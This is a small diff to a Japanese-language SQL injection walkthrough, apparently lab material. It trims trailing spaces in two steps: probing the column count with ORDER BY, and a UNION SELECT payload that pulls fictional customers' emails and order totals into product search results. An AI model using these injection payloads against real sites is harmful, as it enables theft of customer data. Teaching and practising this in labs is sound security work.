@@ -29,7 +29,7 @@ q = '
 ### 2. カラム数を確認する
 
 ```
-q = a%' ORDER BY 4 -- 
+q = a%' ORDER BY 4 --
 ```
 
 → 3カラムしかないためエラー。`ORDER BY 3 -- ` ではエラーが消える。
@@ -37,7 +37,7 @@ q = a%' ORDER BY 4 --
 ### 3. 顧客情報を抜き出す
 
 ```
-q = zzz%' UNION SELECT id, email, last_order_total FROM customers -- 
+q = zzz%' UNION SELECT id, email, last_order_total FROM customers --
 ```
 
 → 商品検索結果に、架空顧客のメールアドレスと直近注文金額が表示される。
